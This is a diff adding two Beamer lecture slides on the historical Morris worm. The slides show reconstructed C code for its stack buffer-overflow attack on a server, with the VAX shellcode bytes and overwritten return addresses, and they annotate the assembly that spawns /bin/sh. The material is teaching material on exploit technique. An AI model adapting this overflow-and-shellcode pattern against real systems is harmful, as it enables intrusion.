@@ -1,0 +1,41 @@
+
+\begin{frame}[fragile,label=morrisEx]{actual example: Morris worm}
+\begin{lstlisting}[language=C,style=smaller]
+    /* reconstructed from machine code */
+    for(i = 0; i < 536; i++) buf[i] = '\0';
+    for(i = 0; i < 400; i++) buf[i] = 1;
+    /* actual shellcode */
+    memcpy(buf + i,
+        ("\335\217/sh\0\335\217/bin\320\032\335\0"
+         "\335\0\335Z\335\003\320\034\\274;\344"
+         "\371\344\342\241\256\343\350\357"
+         "\256\362\351"),
+         28);
+    /* frame pointer, return val, etc.: */
+    *(int*)(&buf[556]) = 0x7fffe9fc;
+    *(int*)(&buf[560]) = 0x7fffe8a8;
+    *(int*)(&buf[564]) = 0x7fffe8bc;
+    ...
+    send(to_server, buf, sizeof(buf))
+    send(to_server, "\n", 1);
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile,label=morrisShell]{Morris shellcode (VAX)}
+\begin{lstlisting}[language=myasm,morekeywords=chmk]
+pushl   $68732f      // "/sh\0"
+pushl   $6e69622f    // "/bin"
+movl    sp, r10
+pushl   $0
+pushl   $0
+pushl   r10
+pushl   $3
+movl    sp,ap
+chmk    $3b  // switch to OS ("CHange Mode to Kernel")
+\end{lstlisting}
+\begin{itemize}
+\item write string /bin/sh on the stack (path to ``shell'')
+\item make OS request to run specified program
+\end{itemize}
+\end{frame}
+
